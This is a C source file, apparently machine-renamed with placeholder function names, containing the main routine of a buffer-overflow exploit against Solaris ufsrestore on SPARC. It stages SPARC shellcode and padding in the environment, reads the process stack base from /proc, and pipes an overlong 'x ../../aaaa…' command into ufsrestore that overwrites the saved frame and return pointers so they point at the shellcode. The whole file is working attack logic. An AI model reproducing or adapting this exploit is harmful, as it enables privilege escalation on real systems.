#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
typedef  int u_long ;
struct TYPE_3__ {int pr_stkbase; int pr_stksize; } ;
typedef  TYPE_1__ pstatus_t ;
typedef  int /*<<< orphan*/  pstatus ;
typedef  int /*<<< orphan*/  platform ;
typedef  scalar_t__ pid_t ;
typedef  int /*<<< orphan*/  FILE ;

/* Variables and functions */
 int EXIT_FAILURE ; 
 int EXIT_SUCCESS ; 
 unsigned long FP_OFFSET ; 
 int /*<<< orphan*/  O_RDONLY ; 
 int /*<<< orphan*/  PROG ; 
 int FUNC0 (int) ; 
 int SHELLCODE_OFFSET ; 
 int /*<<< orphan*/  SI_PLATFORM ; 
 int STDERR_FILENO ; 
 int STDIN_FILENO ; 
 int STDOUT_FILENO ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (int,int) ; 
 int /*<<< orphan*/  FUNC3 (char*,char**,char**) ; 
 int /*<<< orphan*/  FUNC4 (int) ; 
 int /*<<< orphan*/ * FUNC5 (int,char*) ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ *) ; 
 scalar_t__ FUNC7 () ; 
 int /*<<< orphan*/  FUNC8 (int /*<<< orphan*/ *,char*) ; 
 int FUNC9 () ; 
 int FUNC10 (char*,int /*<<< orphan*/ ) ; 
 char* pad1 ; 
 char* pad2 ; 
 int /*<<< orphan*/  FUNC11 (char*) ; 
 scalar_t__ FUNC12 (int*) ; 
 scalar_t__ FUNC13 (int,TYPE_1__*,int) ; 
 int /*<<< orphan*/  FUNC14 (int /*<<< orphan*/ ,char*) ; 
 char* sparc_shellcode ; 
 int /*<<< orphan*/  FUNC15 (char*,char*,...) ; 
 int /*<<< orphan*/ * stderr ; 
 char* FUNC16 (char*) ; 
 int FUNC17 (char*) ; 
 scalar_t__ FUNC18 (int /*<<< orphan*/ ,char*,int) ; 

FUNC19()
{
    char *args[4], *envs[5], prog[1024], platform[1024], pathpstatus[1024];
    int argc, envc, len, len2, len3, fd, off, totlen;
    pstatus_t pstatus;
    u_long stacktop, stackstart;
    pid_t pid;
    int mypipe[2];
    FILE *fp;

    /*
     * Try to estimate the stack accurately so we are independent
     * of the platform and arch. No idea how good this all is cause
     * I have limited test plaforms.
     */

    if (FUNC18(SI_PLATFORM, platform, sizeof(platform))<0) {
        FUNC11("sysinfo");
        FUNC4(1);
    }

    FUNC14(PROG,prog);

    args[0] = FUNC16("ufsrestore");
    args[1] = FUNC16("if");
    args[2] = FUNC16("/var/tmp/dumpufs");
    args[3] = NULL;

    len2 = FUNC17(platform) + 1 + FUNC17(prog) + 1;
    len2 = (len2 + 3) & ~3;

    pad2[ 243 - (len2 + FUNC17(sparc_shellcode) + 1) ] = '\0';

    envs[0] = FUNC16(pad1);
    envs[1] = FUNC16(sparc_shellcode);
    envs[2] = FUNC16(pad2);
    envs[3] = NULL;

    len = 0;
    argc = 0;
    while (args[argc] != NULL)
         len += FUNC17(args[argc++]) + 1;

    envc=0;
    len3 = 0;
    while (envs[envc] != NULL)
         len3 += FUNC17(envs[envc++]) + 1;

    /*
     * Try to calculate the proper lengths and sizes. Information on
     * on this can (could) be found in /usr/include/sys/* . Still it is
     * a bit of magic. Some things changed with sol 8 too. Again padding is
     * used to create a predictable location of the shell code.
     */

    envs[0][ 255 - (len + (argc + envc + 4) * 4)] = '\0';

    /* calculate the offset of the shell code */
    off = len + (argc + envc + 3) * 4 + FUNC17(envs[0]) + 1 + SHELLCODE_OFFSET;

    len = ((len3 - ((argc + envc + 4) * 4) + 3) & ~3) + 4;
    len += len2;

    /* Calculate the total size of the data on the stack. SA is still arch
     * dependent (32/64bit) so this part still needs to determine the correct
     * size.
     */
    totlen = FUNC0(len + (argc + envc + 4) * 4);

    /*
     * Get the top of the stack. Didn't know how else to get it.
     * The idea is you can compile the binary and use it on any arch.
     */

    FUNC15(pathpstatus,"/proc/%d/status",FUNC9());

    if ((fd = FUNC10(pathpstatus, O_RDONLY)) < 0 ) {
        FUNC11(pathpstatus);
        FUNC4(1);
    }

    if (FUNC13(fd, &pstatus, sizeof (pstatus)) < 0 ) {
        (void) FUNC1(fd);
        FUNC11("read");
        FUNC4(1);
    }

    stacktop = pstatus.pr_stkbase + pstatus.pr_stksize;
    stackstart = stacktop - totlen;
    (void) FUNC1(fd);

    /* Create the pipe. */
    if (FUNC12 (mypipe)) {
        FUNC8 (stderr, "Pipe failed.\n");
        return EXIT_FAILURE;
    }

    /* Create the child process. */
    pid = FUNC7 ();
    if (pid == (pid_t) 0) {
        /* This is the child process. */
        FUNC1(STDIN_FILENO);
        FUNC2(mypipe[0], STDIN_FILENO);
        FUNC1(STDOUT_FILENO);
        FUNC2(mypipe[1], STDOUT_FILENO);
        FUNC1(STDERR_FILENO);
        FUNC3(prog, args, envs);
        return EXIT_SUCCESS;
    } else if (pid < (pid_t) 0) {
        /* The fork failed. */
        FUNC8 (stderr, "Fork failed.\n");
        return EXIT_FAILURE;
    } else {
        /* This is the parent process. */
        char buf[256];
        unsigned long ptr;

        /*
         * Go into interactive mode with ufsrestore and go into the
         * long path. Then give the 'x' command to force ufsrestore to
         * return outof the command loop and at the same time overflow the
         * path buffer.
         */

        fp = FUNC5(mypipe[1],"w");
        FUNC8(fp,"cd /var/tmp/a*/a*/a*/a*\n");FUNC6(fp);
        FUNC15(buf,"x ../../aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
                     "aaaaaaaaaaaaaaaaaaaaaaaaaaa\n");
        ptr = stackstart - FP_OFFSET;
        *(long *)&buf[FUNC17(buf)-33] = ptr;
        *(long *)&buf[FUNC17(buf)-9]  = ptr;
        ptr = stackstart + off; 
        *(long *)&buf[FUNC17(buf)-5]  = ptr;
        FUNC8(fp,buf);FUNC6(fp);
        return EXIT_SUCCESS;
    }
}